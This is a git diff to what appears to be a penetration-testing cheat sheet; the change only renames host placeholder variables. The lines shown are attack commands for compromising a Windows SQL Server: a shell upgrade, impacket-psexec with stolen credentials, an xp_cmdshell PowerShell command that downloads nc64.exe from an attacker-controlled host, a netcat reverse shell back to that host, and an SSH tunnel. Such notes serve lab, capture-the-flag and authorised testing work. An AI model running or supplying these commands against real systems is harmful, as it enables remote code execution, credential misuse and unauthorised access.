@@ -33,7 +33,7 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 
 Protocol attacks with [impacket](https://github.com/SecureAuthCorp/impacke)
 ```
-impacket-psexec "./$WINUSER:$WINPASS"@$RHOST
+impacket-psexec "./$WINUSER:$WINPASS"@$RIP
 ```
 
 SQL Server
@@ -56,15 +56,15 @@ EXEC xp_cmdshell 'net user';
 	
 Download and run nc64.exe
 ```
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://[[$LHOST]]:8080/nc64.exe -outfile nc64.exe"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://[[$LIP]]:8080/nc64.exe -outfile nc64.exe"
 ```
 	
 Obtain reverse shell
 ```
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe [[$LHOST]] [[$LPORT]]"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe [[$LIP]] [[$LPORT]]"
 ```
 
 Estabish SSH tunnel (local port: `8888`, remote host: `localhost`, remote port: `80`)
 ```
-ssh -L 8888:localhost:80 -i ~/.ssh/id_trash_ed25519 $RUSER@$RHOST
+ssh -L 8888:localhost:80 -i ~/.ssh/id_trash_ed25519 $RUSER@$RIP
 ```
